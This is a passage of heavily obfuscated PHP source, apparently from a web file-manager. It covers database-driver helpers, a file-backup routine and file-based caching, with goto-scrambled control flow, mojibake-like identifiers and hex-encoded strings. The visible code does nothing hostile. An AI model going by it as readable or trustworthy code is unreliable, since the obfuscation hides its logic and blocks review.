$E¨¥É®ë…¶[$cá¢™ñöÈ≤[93]] : !1)); } } goto AŸØÔ√˘÷Ω; AŸØÔ√˘÷Ω: return $aø„ﬁñÇú¥; goto B·ûÍ¶õÀâ; D™≠íÌ»Î«: $cá¢™ñöÈ≤ =& $_SERVER[’ÿƒ†ïò]; $this->initConnect(!0); if (think_config($cá¢™ñöÈ≤[922])) { $a˘–î¥⁄¯‹ = str_replace($cá¢™ñöÈ≤[923], $C÷ó¯ÜÖÔ¥, think_config($cá¢™ñöÈ≤[922])); } else { switch ($this->dbType) { case $cá¢™ñöÈ≤[906]: case $cá¢™ñöÈ≤[924]: $a˘–î¥⁄¯‹ = "\123\105\114\x45\103\x54\x20\x20\40\143\157\154\165\155\x6e\137\x6e\x61\x6d\x65\x20\141\163\x20\x27\116\141\x6d\145\47\x2c\x20\40\x20\x64\x61\164\141\x5f\164\171\x70\x65\x20\x61\163\x20\x27\124\x79\x70\145\47\x2c\40\40\40\143\x6f\154\165\155\x6e\x5f\x64\145\x66\x61\x75\154\164\x20\141\163\40\47\x44\x65\146\x61\x75\154\x74\47\x2c\40\40\40\151\163\137\x6e\165\x6c\154\141\x62\x6c\x65\40\x61\163\40\47\116\165\x6c\154\47\xa\x9\11\x46\x52\117\115\11\151\x6e\146\x6f\x72\x6d\x61\x74\x69\157\x6e\137\x73\143\x68\145\x6d\141\56\164\141\142\x6c\x65\163\x20\101\x53\40\164\12\11\11\x4a\117\111\116\x9\x69\156\146\157\x72\x6d\x61\164\151\x6f\x6e\x5f\163\143\150\145\155\141\56\x63\157\x6c\x75\x6d\x6e\x73\40\101\123\40\x63\xa\x9\x9\117\x4e\x20\x20\x74\x2e\x74\141\142\154\x65\x5f\x63\141\x74\141\154\x6f\147\x20\x3d\40\x63\56\x74\141\142\154\145\137\143\141\x74\x61\x6c\x6f\147\12\11\11\101\116\104\40\164\56\164\141\x62\x6c\x65\x5f\163\x63\x68\x65\x6d\141\x20\75\x20\143\56\x74\141\142\154\x65\137\163\143\150\145\x6d\x61\xa\11\x9\101\x4e\104\x20\x74\56\164\x61\142\x6c\145\x5f\x6e\141\x6d\145\40\x3d\40\143\56\164\x61\x62\154\x65\137\156\141\x6d\145\12\11\x9\x57\110\105\x52\x45\x20\x20\40\x74\56\x74\x61\x62\x6c\145\137\156\141\155\x65\x20\x3d\40\47{$C÷ó¯ÜÖÔ¥}\x27"; break; case $cá¢™ñöÈ≤[925]: $a˘–î¥⁄¯‹ = $cá¢™ñöÈ≤[926] . $C÷ó¯ÜÖÔ¥ . $cá¢™ñöÈ≤[927]; break; case $cá¢™ñöÈ≤[907]: case $cá¢™ñöÈ≤[909]: $a˘–î¥⁄¯‹ = $cá¢™ñöÈ≤[928] . $cá¢™ñöÈ≤[929] . $cá¢™ñöÈ≤[930] . strtoupper($C÷ó¯ÜÖÔ¥) . $cá¢™ñöÈ≤[931] . strtoupper($C÷ó¯ÜÖÔ¥) . $cá¢™ñöÈ≤[932]; break; case $cá¢™ñöÈ≤[933]: $a˘–î¥⁄¯‹ = $cá¢™ñöÈ≤[934] . $C÷ó¯ÜÖÔ¥ . $cá¢™ñöÈ≤[935]; break; case $cá¢™ñöÈ≤[908]: break; case $cá¢™ñöÈ≤[936]: default: $a˘–î¥⁄¯‹ = $cá¢™ñöÈ≤[937] . ($this->dbType == $cá¢™ñöÈ≤[936] ? "\140{$C÷ó¯ÜÖÔ¥}\140" : $C÷ó¯ÜÖÔ¥); } } goto FÖ´‰“£˘æ; B·ûÍ¶õÀâ: } public function getTables($AØﬂÍ¡î‚Ò = '') { $b¶…Õıç˜Ç =& $_SERVER[’ÿƒ†ïò]; if (think_config($b¶…Õıç˜Ç[939])) { $CÊæ—âë‚ = str_replace($b¶…Õıç˜Ç[940], $AØﬂÍ¡î‚Ò, think_config($b¶…Õıç˜Ç[939])); } else { switch ($this->dbType) { case $b¶…Õıç˜Ç[907]: case $b¶…Õıç˜Ç[909]: $CÊæ—âë‚ = $b¶…Õıç˜Ç[941]; break; case $b¶…Õıç˜Ç[906]: case $b¶…Õıç˜Ç[924]: $CÊæ—âë‚ = $b¶…Õıç˜Ç[942]; break; case $b¶…Õıç˜Ç[933]: $CÊæ—âë‚ = $b¶…Õıç˜Ç[943]; break; case $b¶…Õıç˜Ç[908]: think_exception(think_lang($b¶…Õıç˜Ç[944]) . $b¶…Õıç˜Ç[945]); break; case $b¶…Õıç˜Ç[925]: $CÊæ—âë‚ = $b¶…Õıç˜Ç[42] . $b¶…Õıç˜Ç[43] . $b¶…Õıç˜Ç[44]; break; case $b¶…Õıç˜Ç[936]: default: if (!empty($AØﬂÍ¡î‚Ò)) { $CÊæ—âë‚ = $b¶…Õıç˜Ç[889] . $AØﬂÍ¡î‚Ò . $b¶…Õıç˜Ç[890]; } else { $CÊæ—âë‚ = $b¶…Õıç˜Ç[891]; } } } $aº≠®æÖ“Ë = $this->query($CÊæ—âë‚); $eø∑◊û„Í = array(); foreach ($aº≠®æÖ“Ë as $a£ôÜ∑°—≠ => $A∆ÃåÒÌ° ) { $eø∑◊û„Í[$a£ôÜ∑°—≠] = current($A∆ÃåÒÌ° ); } return $eø∑◊û„Í; } protected function parseLimit($D‹ô§âˆ¿˜) { $eÔòÑŸãÃ› =& $_SERVER[’ÿƒ†ïò]; $E’õ„ºéÛê = $eÔòÑŸãÃ›[33]; if (!empty($D‹ô§âˆ¿˜)) { switch ($this->dbType) { case $eÔòÑŸãÃ›[933]: case $eÔòÑŸãÃ›[925]: $D‹ô§âˆ¿˜ = explode($eÔòÑŸãÃ›[47], $D‹ô§âˆ¿˜); if (count($D‹ô§âˆ¿˜) > 1) { $E’õ„ºéÛê .= $eÔòÑŸãÃ›[48] . $D‹ô§âˆ¿˜[1] . $eÔòÑŸãÃ›[49] . $D‹ô§âˆ¿˜[0] . $eÔòÑŸãÃ›[50]; } else { $E’õ„ºéÛê .= $eÔòÑŸãÃ›[48] . $D‹ô§âˆ¿˜[0] . $eÔòÑŸãÃ›[50]; } break; case $eÔòÑŸãÃ›[906]: case $eÔòÑŸãÃ›[924]: break; case $eÔòÑŸãÃ›[908]: break; case $eÔòÑŸãÃ›[907]: case $eÔòÑŸãÃ›[909]: break; case $eÔòÑŸãÃ›[936]: default: $E’õ„ºéÛê .= $eÔòÑŸãÃ›[48] . $D‹ô§âˆ¿˜ . $eÔòÑŸãÃ›[50]; } } return $E’õ„ºéÛê; } public function parseKey(&$D«ïïÀ’È, $Cˆ’Üç√ é = true) { $FÂ∫∫Ü®£è =& $_SERVER[’ÿƒ†ïò]; if ($Cˆ’Üç√ é) { $D«ïïÀ’È = $this->parseKeyCheck($D«ïïÀ’È); } if ($this->dbType == $FÂ∫∫Ü®£è[936]) { if ($D«ïïÀ’È != $FÂ∫∫Ü®£è[182] && !preg_match($FÂ∫∫Ü®£è[901], $D«ïïÀ’È)) { $D«ïïÀ’È = $FÂ∫∫Ü®£è[383] . trim($D«ïïÀ’È, $FÂ∫∫Ü®£è[383]) . $FÂ∫∫Ü®£è[383]; } return $D«ïïÀ’È; } else { return parent::parseKey($D«ïïÀ’È, $Cˆ’Üç√ é); } } public function close() { $this->_linkID = null; } public function error() { $f¿Ûâàöø¡ =& $_SERVER[’ÿƒ†ïò]; if ($this->PDOStatement) { $BÒÖ∫ä˜èÍ = $this->PDOStatement->errorInfo(); $this->error = $BÒÖ∫ä˜èÍ[1] . $f¿Ûâàöø¡[4] . $BÒÖ∫ä˜èÍ[2]; } else { $this->error = $f¿Ûâàöø¡[33]; } if ($f¿Ûâàöø¡[33] != $this->queryStr) { $this->error .= LNG($f¿Ûâàöø¡[45]) . $this->queryStr; } think_trace($this->error, $f¿Ûâàöø¡[33], $f¿Ûâàöø¡[46]); return $this->error; } public function escapeString($EüÁÚÀ…Öú) { $e’∞÷Ç¡ÂÕ =& $_SERVER[’ÿƒ†ïò]; switch ($this->dbType) { case $e’∞÷Ç¡ÂÕ[933]: case $e’∞÷Ç¡ÂÕ[906]: case $e’∞÷Ç¡ÂÕ[924]: case $e’∞÷Ç¡ÂÕ[936]: return addslashes($EüÁÚÀ…Öú); case $e’∞÷Ç¡ÂÕ[908]: case $e’∞÷Ç¡ÂÕ[925]: case $e’∞÷Ç¡ÂÕ[907]: case $e’∞÷Ç¡ÂÕ[909]: return str_ireplace($e’∞÷Ç¡ÂÕ[55], $e’∞÷Ç¡ÂÕ[56], $EüÁÚÀ…Öú); } } protected function parseValue($Aâœë¨–ê·) { $eÎÇÌäêœõ =& $_SERVER[’ÿƒ†ïò]; if (is_string($Aâœë¨–ê·)) { $bä≤«±»Õ˘ = strpos($Aâœë¨–ê·, $eÎÇÌäêœõ[4]) === 0 && in_array($Aâœë¨–ê·, array_keys($this->bind)); $Aâœë¨–ê· = $bä≤«±»Õ˘ ? $this->escapeString($Aâœë¨–ê·) : $eÎÇÌäêœõ[946] . $this->escapeString($Aâœë¨–ê·) . $eÎÇÌäêœõ[946]; } elseif (isset($Aâœë¨–ê·[0]) && is_string($Aâœë¨–ê·[0]) && strtolower($Aâœë¨–ê·[0]) == $eÎÇÌäêœõ[295]) { $Aâœë¨–ê· = $this->escapeString($Aâœë¨–ê·[1]); } elseif (is_array($Aâœë¨–ê·)) { $Aâœë¨–ê· = array_map(array($this, $eÎÇÌäêœõ[947]), $Aâœë¨–ê·); } elseif (is_bool($Aâœë¨–ê·)) { $Aâœë¨–ê· = $Aâœë¨–ê· ? $eÎÇÌäêœõ[87] : $eÎÇÌäêœõ[191]; } elseif (is_null($Aâœë¨–ê·)) { $Aâœë¨–ê· = $eÎÇÌäêœõ[103]; } return $Aâœë¨–ê·; } public function getLastInsertId() { $FöªåÈá◊÷ =& $_SERVER[’ÿƒ†ïò]; switch ($this->dbType) { case $FöªåÈá◊÷[933]: case $FöªåÈá◊÷[925]: case $FöªåÈá◊÷[906]: case $FöªåÈá◊÷[924]: case $FöªåÈá◊÷[908]: case $FöªåÈá◊÷[936]: return $this->_linkID->lastInsertId(); case $FöªåÈá◊÷[907]: case $FöªåÈá◊÷[909]: $A≥ÓÓßÉﬁµ = $this->table; $cÁı·£Õç⁄ = $this->query("\123\105\114\105\x43\124\40{$A≥ÓÓßÉﬁµ}\x2e\143\x75\x72\162\x76\x61\154\40\143\x75\162\162\166\141\x6c\x20\x46\122\117\x4d\40\x64\165\141\154"); return $cÁı·£Õç⁄ ? $cÁı·£Õç⁄[0][$FöªåÈá◊÷[948]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($dÑ–Ù”ãâ⁄) { $B“ΩÁã‡Ì™ =& $_SERVER[’ÿƒ†ïò]; if (!CacheLock::fileLock($B“ΩÁã‡Ì™[9])) { return !1; } $d§úˆïÁÏÿ = parent::query($dÑ–Ù”ãâ⁄); CacheLock::fileUnLock($B“ΩÁã‡Ì™[9]); return $d§úˆïÁÏÿ; } public function execute($DÊ£¶ä ≠∆) { $eÔëûÊœÑ˜ =& $_SERVER[’ÿƒ†ïò]; if (!CacheLock::fileLock($eÔëûÊœÑ˜[9])) { return !1; } $B‚æ≥∂Íèå = parent::execute($DÊ£¶ä ≠∆); CacheLock::fileUnLock($eÔëûÊœÑ˜[9]); return $B‚æ≥∂Íèå; } } goto dÏ∫Ã≠å∏Á; EÖπ∆‹ŸΩ : class BackupFile { public function __construct() { } public function index() { goto e¡ÈÎºÑÇÿ; e¡ÈÎºÑÇÿ: $c±Ü¥«ãÍ = Backup::get(); $eäíÖÙÉÚ· = $c±Ü¥«ãÍ[$_SERVER[’ÿƒ†ïò][291]][$_SERVER[’ÿƒ†ïò][193]][$_SERVER[’ÿƒ†ïò][461]]; $EéÓ¿¢ﬁè– = array($_SERVER[’ÿƒ†ïò][462] => array($_SERVER[’ÿƒ†ïò][802], $eäíÖÙÉÚ·), $_SERVER[’ÿƒ†ïò][803] => array($_SERVER[’ÿƒ†ïò][329], $c±Ü¥«ãÍ[$_SERVER[’ÿƒ†ïò][740]])); goto bÀØóÏÉõΩ; BâÕåπàÚ›: $d‡à£ı¡¥‰ = 1000; $E›±ûèèË = $b¯Â⁄îêêû = 0; $DÇ√ó√´‰ = array(); goto d›Œ„±·“ß; cêÌÇíÊÖÊ: $Cñ˜ÂÇÃÀÑ = array($_SERVER[’ÿƒ†ïò][818] => 1, $_SERVER[’ÿƒ†ïò][490] => time(), $_SERVER[’ÿƒ†ïò][763] => 1, $_SERVER[’ÿƒ†ïò][815] => $eäíÖÙÉÚ·, $_SERVER[’ÿƒ†ïò][807] => $FÈ∑Ôêé∞’, $_SERVER[’ÿƒ†ïò][806] => $cΩæêâŒœõ, $_SERVER[’ÿƒ†ïò][819] => time()); if ($b¯Â⁄îêêû) { $Cñ˜ÂÇÃÀÑ[$_SERVER[’ÿƒ†ïò][816]] = $fù”è∆‘±Ì; $Cñ˜ÂÇÃÀÑ[$_SERVER[’ÿƒ†ïò][817]] = $BÂ†Ü§…‹®; } Backup::set($Cñ˜ÂÇÃÀÑ); goto fı≈Ò∆‡Áü; fı≈Ò∆‡Áü: $this->_fileFilter($DÇ√ó√´‰); return !0; goto B˘ªÕ›ë›ª; d›Œ„±·“ß: $BÂ†Ü§…‹® = $fù”è∆‘±Ì = 0; do { $a¥¥ı øØº = $_SERVER[’ÿƒ†ïò][809]; $dãò°ê∫”≥ = Model($_SERVER[’ÿƒ†ïò][775])->where($EéÓ¿¢ﬁè–)->field($a¥¥ı øØº)->order($_SERVER[’ÿƒ†ïò][810])->selectPage($d‡à£ı¡¥‰, $dêÑ¯˘ÓÆë); $EØæÖ–»—∑ = !empty($dãò°ê∫”≥[$_SERVER[’ÿƒ†ïò][367]]) ? $dãò°ê∫”≥[$_SERVER[’ÿƒ†ïò][367]] : array(); foreach ($EØæÖ–»—∑ as $F°õÇ ≤ﬁ‰) { goto FÔÓö…‹˜ä; Cæù®Àû—õ: $E›±ûèèË += $F°õÇ ≤ﬁ‰[$_SERVER[’ÿƒ†ïò][78]]; $fù”è∆‘±Ì += 1; $BÂ†Ü§…‹® += $F°õÇ ≤ﬁ‰[$_SERVER[’ÿƒ†ïò][78]]; goto Dêá–òâﬂı; B£ıπ≈∏¢ƒ: if (IO::exist($D∫—Ú¢∂µ»)) { $F⁄”á’úêé->updateFileEnd($F°õÇ ≤ﬁ‰[$_SERVER[’ÿƒ†ïò][28]], $F°õÇ ≤ﬁ‰[$_SERVER[’ÿƒ†ïò][78]]); } else { $D∫—Ú¢∂µ» = get_path_father($D∫—Ú¢∂µ»); IO::mkdir($D∫—Ú¢∂µ»); if (!IO::copy($D‹¿≥¥øÑí, $D∫—Ú¢∂µ», $_SERVER[’ÿƒ†ïò][813])) { write_log($_SERVER[’ÿƒ†ïò][814] . $D‹¿≥¥øÑí . $_SERVER[’ÿƒ†ïò][797] . $D∫—Ú¢∂µ» . $_SERVER[’ÿƒ†ïò][530], $_SERVER[’ÿƒ†ïò][770]); $dì—πñ´‰á = !1; break; } } $eäíÖÙÉÚ· = $F°õÇ ≤ﬁ‰[$_SERVER[’ÿƒ†ïò][461]]; $b¯Â⁄îêêû += 1; goto Cæù®Àû—õ; FÔÓö…‹˜ä: if (!$this->_fileExist($F°õÇ ≤ﬁ‰, $DÇ√ó√´‰, $eã∫¶êË‡)) { $cΩæêâŒœõ -= 1; $FÈ∑Ôêé∞’ -= (int) $F°õÇ ≤ﬁ‰[$_SERVER[’ÿƒ†ïò][78]]; write_log("\x66\x69\x6c\x65\x20\x6e\x6f\164\x20\145\170\x69\x73\x74\56\146\151\154\x65\111\104\72{$F°õÇ ≤ﬁ‰[$_SERVER[’ÿƒ†ïò][461]]}\54\x20\160\x61\x74\x68\72{$F°õÇ ≤ﬁ‰[$_SERVER[’ÿƒ†ïò][76]]}", $_SERVER[’ÿƒ†ïò][811]); continue; } $D‹¿≥¥øÑí = $F°õÇ ≤ﬁ‰[$_SERVER[’ÿƒ†ïò][76]]; $D∫—Ú¢∂µ» = "\173\x69\x6f\72{$c±Ü¥«ãÍ[$_SERVER[’ÿƒ†ïò][740]]}\175" . substr($D‹¿≥¥øÑí, strlen("\x7b\x69\x6f\x3a{$F°õÇ ≤ﬁ‰[$_SERVER[’ÿƒ†ïò][812]]}\x7d")); goto B£ıπ≈∏¢ƒ; Dêá–òâﬂı: if ($E›±ûèèË >= 1024 * 1024 * 100) { $Cñ˜ÂÇÃÀÑ = array($_SERVER[’ÿƒ†ïò][815] => $eäíÖÙÉÚ·, $_SERVER[’ÿƒ†ïò][816] => $fù”è∆‘±Ì, $_SERVER[’ÿƒ†ïò][817] => $BÂ†Ü§…‹®); Backup::set($Cñ˜ÂÇÃÀÑ); $E›±ûèèË = $b¯Â⁄îêêû = 0; } goto f¶Òıú∑Æı; f¶Òıú∑Æı: } $Eâüãƒ‚∂ã = count($EØæÖ–»—∑); $dêÑ¯˘ÓÆë++; } while ($Eâüãƒ‚∂ã == $d‡à£ı¡¥‰); $F⁄”á’úêé->end(); goto cêÌÇíÊÖÊ; bÀØóÏÉõΩ: $cΩæêâŒœõ = (int) Model($_SERVER[’ÿƒ†ïò][775])->where($EéÓ¿¢ﬁè–)->count($_SERVER[’ÿƒ†ïò][461]); $FÈ∑Ôêé∞’ = (int) Model($_SERVER[’ÿƒ†ïò][775])->where($EéÓ¿¢ﬁè–)->sum($_SERVER[’ÿƒ†ïò][78]); $F⁄”á’úêé = new TaskFileTransfer($_SERVER[’ÿƒ†ïò][804], $_SERVER[’ÿƒ†ïò][770], $cΩæêâŒœõ, LNG($_SERVER[’ÿƒ†ïò][771]) . $_SERVER[’ÿƒ†ïò][772] . LNG($_SERVER[’ÿƒ†ïò][805])); goto cÇŸÈ¡˜Êì; b≤¡È›®ã: $dì—πñ´‰á = !0; $eã∫¶êË‡ = $this->storeIds(); $dêÑ¯˘ÓÆë = 1; goto BâÕåπàÚ›; cÇŸÈ¡˜Êì: $F⁄”á’úêé->task[$_SERVER[’ÿƒ†ïò][751]] = $FÈ∑Ôêé∞’; $Cñ˜ÂÇÃÀÑ = array($_SERVER[’ÿƒ†ïò][806] => $cΩæêâŒœõ, $_SERVER[’ÿƒ†ïò][807] => $FÈ∑Ôêé∞’, $_SERVER[’ÿƒ†ïò][808] => time()); Backup::set($Cñ˜ÂÇÃÀÑ); goto b≤¡È›®ã; B˘ªÕ›ë›ª: } private function _fileExist($d™Ÿı≤üÜ¯, &$C©÷ë∞Á¬∫, $a÷À∂çÌ¢Ö) { goto FÏ≠Ëõß≥Û; Aﬂÿ•äÎ∂Œ: if (IO::exist($fë¢°¥Ïàë)) { $C©÷ë∞Á¬∫[] = $d™Ÿı≤üÜ¯[$b¬ﬁªòﬂ™[461]]; return !1; } $B‚ø€¬ ‡É = array($b¬ﬁªòﬂ™[812] => $d™Ÿı≤üÜ¯[$b¬ﬁªòﬂ™[812]], $b¬ﬁªòﬂ™[76] => array($b¬ﬁªòﬂ™[381], "{$fë¢°¥Ïàë}\45")); $F≥„Àò‚ªƒ = Model($b¬ﬁªòﬂ™[775])->where($B‚ø€¬ ‡É)->field($b¬ﬁªòﬂ™[462])->select(); goto f€„πÛÓüì; FÏ≠Ëõß≥Û: $b¬ﬁªòﬂ™ =& $_SERVER[’ÿƒ†ïò]; $D¢§€«ÙÚù = $d™Ÿı≤üÜ¯[$b¬ﬁªòﬂ™[76]]; if (in_array($d™Ÿı≤üÜ¯[$b¬ﬁªòﬂ™[461]], $C©÷ë∞Á¬∫)) { return !1; } goto FÒú÷≥√ºû; FÒú÷≥√ºû: if (!in_array($d™Ÿı≤üÜ¯[$b¬ﬁªòﬂ™[812]], $a÷À∂çÌ¢Ö)) { return !1; } if (IO::exist($D¢§€«ÙÚù)) { return !0; } $fë¢°¥Ïàë = get_path_father($D¢§€«ÙÚù); goto Aﬂÿ•äÎ∂Œ; f€„πÛÓüì: $C©÷ë∞Á¬∫ = array_merge($C©÷ë∞Á¬∫, array_to_keyvalue($F≥„Àò‚ªƒ, $b¬ﬁªòﬂ™[33], $b¬ﬁªòﬂ™[461])); return !1; goto dËŒê◊∑∏˘; dËŒê◊∑∏˘: } private function _fileFilter($féïí’ƒ¥›) { $Dÿë™í‹„ƒ =& $_SERVER[’ÿƒ†ïò]; if (empty($féïí’ƒ¥›)) { return; } $eŒöêˆ„¥ = array($Dÿë™í‹„ƒ[461] => array($Dÿë™í‹„ƒ[7], array_unique($féïí’ƒ¥›))); $f±µÿè≈Éª = Model($Dÿë™í‹„ƒ[820])->where($eŒöêˆ„¥)->field($Dÿë™í‹„ƒ[397])->select(); foreach ($f±µÿè≈Éª as $fäú…¥ì®Ñ) { Model($Dÿë™í‹„ƒ[820])->remove($fäú…¥ì®Ñ[$Dÿë™í‹„ƒ[397]], !1); } } private function storeIds() { $D¿¡ŒüÕäÇ =& $_SERVER[’ÿƒ†ïò]; $b¥ò∞•ÓéÇ = Model($D¿¡ŒüÕäÇ[755])->listData(); $eÜπ¯ûõ˘‡ = array(); $e˜∂ñÒÖÒÎ = $GLOBALS[$D¿¡ŒüÕäÇ[6]][$D¿¡ŒüÕäÇ[88]][$D¿¡ŒüÕäÇ[821]]; foreach ($b¥ò∞•ÓéÇ as $fπ•ËöÑ≥∑) { $c⁄›Ãó…Ö¨ = strtolower($fπ•ËöÑ≥∑[$D¿¡ŒüÕäÇ[94]]); if (!isset($e˜∂ñÒÖÒÎ[$c⁄›Ãó…Ö¨])) { continue; } $Fù ı‰É©ﬁ = $D¿¡ŒüÕäÇ[72] . (isset($e˜∂ñÒÖÒÎ[$c⁄›Ãó…Ö¨]) ? $e˜∂ñÒÖÒÎ[$c⁄›Ãó…Ö¨] : ucfirst($c⁄›Ãó…Ö¨)); if (!class_exists($Fù ı‰É©ﬁ)) { continue; } $eÜπ¯ûõ˘‡[] = $fπ•ËöÑ≥∑[$D¿¡ŒüÕäÇ[395]]; } return $eÜπ¯ûõ˘‡; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto e≤…ÿå≠‚≥; e≤…ÿå≠‚≥: $dòıá‡À»Ç =& $_SERVER[’ÿƒ†ïò]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto DΩ∞¯‡ ∞ˆ; Eôá£§Ë«ÿ: switch ($d¥¡âŸŸñ∂[$dòıá‡À»Ç[822]]) { case $dòıá‡À»Ç[17]: self::$handle = Model($dòıá‡À»Ç[824]); break; case $dòıá‡À»Ç[825]: self::$handle = new CacheRedis($AÀ‰Ï÷ºô’, $BÔ‹Âí…‹í); break; case $dòıá‡À»Ç[826]: self::$handle = new CacheMemcached($AÀ‰Ï÷ºô’, $BÔ‹Âí…‹í); break; case $dòıá‡À»Ç[193]: self::$handle = new CacheFile($AÀ‰Ï÷ºô’, $BÔ‹Âí…‹í); break; default: break; } return self::$handle; goto aÉŒÇö˜à¥; DΩ∞¯‡ ∞ˆ: $d¥¡âŸŸñ∂ = $GLOBALS[$dòıá‡À»Ç[6]][$dòıá‡À»Ç[347]]; $AÀ‰Ï÷ºô’ = $d¥¡âŸŸñ∂[$d¥¡âŸŸñ∂[$dòıá‡À»Ç[822]]]; $BÔ‹Âí…‹í = $d¥¡âŸŸñ∂[$dòıá‡À»Ç[823]]; goto Eôá£§Ë«ÿ; aÉŒÇö˜à¥: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($C”ö≈ãÂÇå) { if (is_array($C”ö≈ãÂÇå) || is_object($C”ö≈ãÂÇå)) { $C”ö≈ãÂÇå = json_encode($C”ö≈ãÂÇå); } $C”ö≈ãÂÇå = rawurlencode($C”ö≈ãÂÇå); return md5(KOD_SITE_ID . $_SERVER[’ÿƒ†ïò][71] . $C”ö≈ãÂÇå); } public static function get($CΩàãÁà≥å, $BÕà’Áäøñ = false) { $aº¿Øó†≥è = self::key($CΩàãÁà≥å); if ($BÕà’Áäøñ) { return unserialize(self::init()->get($aº¿Øó†≥è)); } if (!isset(self::$memoryCache[$aº¿Øó†≥è])) { $A‡äÖÿÖ∂Í = self::init()->get($aº¿Øó†≥è); self::$memoryCache[$aº¿Øó†≥è] = unserialize($A‡äÖÿÖ∂Í); } return self::$memoryCache[$aº¿Øó†≥è]; } public static function set($A£çîœêíﬁ, $D≥Ÿ»‡–Òˆ, $bõ≠ùíŸ±œ = false) { goto dïÍÒü§∫¯; dïÍÒü§∫¯: $cÀñù¨©ˆÇ = self::key($A£çîœêíﬁ); if (isset(self::$memoryCache[$cÀñù¨©ˆÇ]) && self::$memoryCache[$cÀñù¨©ˆÇ] === $D≥Ÿ»‡–Òˆ) { return !0; } if ($bõ≠ùíŸ±œ === 0) { self::$memoryCache[$cÀñù¨©ˆÇ] = $D≥Ÿ»‡–Òˆ; return !0; } goto bá∂ñ¥ÜËı; bá∂ñ¥ÜËı: CacheLock::lock($A£çîœêíﬁ); $d™éÏ√õá® = self::init()->set($cÀñù¨©ˆÇ, serialize($D≥Ÿ»‡–Òˆ), $bõ≠ùíŸ±œ); self::$memoryCache[$cÀñù¨©ˆÇ] = $D≥Ÿ»‡–Òˆ; goto c¯©¥ÛäŸˆ; c¯©¥ÛäŸˆ: CacheLock::unlock($A£çîœêíﬁ); return $d™éÏ√õá®; goto c‘Ò⁄±¡ı¢; c‘Ò⁄±¡ı¢: } public static function getCall($AÁ∑úÆ ‹˜, $eı¬ıúæ’, $b≈Óéó±Ÿ‰, $còœ”ÑÃ¿≈ = array()) { goto D∑î©€Ù©Ô; D∑î©€Ù©Ô: $f†◊ÀÉ€¢‡ =& $_SERVER[’ÿƒ†ïò]; $AÜﬂ¢√¬´É = self::get($AÁ∑úÆ ‹˜); if ($AÜﬂ¢√¬´É || $AÜﬂ¢√¬´É === $f†◊ÀÉ€¢‡[33]) { return $AÜﬂ¢√¬´É; } goto DÆÇ„ëûÖ—; bà∂õäπ»–: return $AÜﬂ¢√¬´É; goto F‘«∆ãΩÆô; DÆÇ„ëûÖ—: $AÜﬂ¢√¬´É = call_user_func_array($b≈Óéó±Ÿ‰, $còœ”ÑÃ¿≈); $AÜﬂ¢√¬´É = $AÜﬂ¢√¬´É ? $AÜﬂ¢√¬´É : $f†◊ÀÉ€¢‡[33]; self::set($AÁ∑úÆ ‹˜, $AÜﬂ¢√¬´É, $eı¬ıúæ’); goto bà∂õäπ»–; F‘«∆ãΩÆô: } public static function remove($FŸÜ »õç«) { goto C©π∏«¨ê≠; D÷ÀÜˆµ®Œ: return $d˘∫çÛÙÌà; goto E®®ÜÏ ãå; B‰¨ıáè÷ô: CacheLock::lock($FŸÜ »õç«); $d˘∫çÛÙÌà = self::init()->remove($eµ¿ÉúÍ≥å); CacheLock::unlock($FŸÜ »õç«); goto D÷ÀÜˆµ®Œ; C©π∏«¨ê≠: $eµ¿ÉúÍ≥å = self::key($FŸÜ »õç«); unset(self::$memoryCache[$eµ¿ÉúÍ≥å]); self::clearTimeout(); goto B‰¨ıáè÷ô; E®®ÜÏ ãå: } public static function removeMemory($eÜÊÙúé≤ú) { $bª ﬂŒ≥∞» = self::key($eÜÊÙúé≤ú); unset(self::$memoryCache[$bª ﬂŒ≥∞»]); } public static function clearMemory($A›≠òÿãıÍ = false) { if ($A›≠òÿãıÍ) { $A›≠òÿãıÍ = self::key($A›≠òÿãıÍ); unset(self::$memoryCache[$A›≠òÿãıÍ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[’ÿƒ†ïò][827])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[’ÿƒ†ïò][828])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Fé¬í•˘∆Ã, $DÖéÇÇ‚À∞) { $A˘≠õÔ÷Ó’ =& $_SERVER[’ÿƒ†ïò]; $this->cachePath = $Fé¬í•˘∆Ã[$A˘≠õÔ÷Ó’[76]]; $this->prefix = $A˘≠õÔ÷Ó’[829]; $this->cacheTime = $DÖéÇÇ‚À∞; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Dã ôÃà∫–) { $DﬁÂÔúûÜã =& $_SERVER[’ÿƒ†ïò]; $Dã ôÃà∫– = str_replace(array($DﬁÂÔúûÜã[830], $DﬁÂÔúûÜã[97], $DﬁÂÔúûÜã[70]), $DﬁÂÔúûÜã[831], $Dã ôÃà∫–); return $this->cachePath . $DﬁÂÔúûÜã[832] . $Dã ôÃà∫– . $DﬁÂÔúûÜã[833]; } public function set($bÑŒÃ´Óò∏, $aë‰Íéí∫–, $dáı‹£•±∏ = false) { $Eêê¿∂ı˜± = $this->getFile($bÑŒÃ´Óò∏); if (file_put_contents($Eêê¿∂ı˜±, $this->prefix . $aë‰Íéí∫–, LOCK_EX)) { @touch($Eêê¿∂ı˜±, intval(time() + $dáı‹£•±∏)); clearstatcache(); return !0; } @unlink($Eêê¿∂ı˜±); return !1; } public function get($b’â´»÷é») { $Aûø°⁄Àëù = $this->getFile($b’â´»÷é»); if (file_exists($Aûø°⁄Àëù) && filemtime($Aûø°⁄Àëù) < time()) { @unlink($Aûø°⁄Àëù); return !1; } $Fé¢÷°ÀÍÁ = @file_get_contents($Aûø°⁄Àëù); return substr($Fé¢÷°ÀÍÁ, strlen($this->prefix)); } public function remove($c”›Ò±∞⁄ù) { $eÖöÿ’◊›Ë = $this->getFile($c”›Ò±∞⁄ù); return @unlink($eÖöÿ’◊›Ë); } public function deleteAll() { $DÈÏâÛÑßÒ =& $_SERVER[’ÿƒ†ïò]; $C¢Ôõ∏°’œ = scandir($this->cachePath); foreach ($C¢Ôõ∏°’œ as $Aëœ¨¡…ââ) { $Dêâäú÷ÿé = $this->cachePath . $Aëœ¨¡…ââ; if (strpos($Dêâäú÷ÿé, 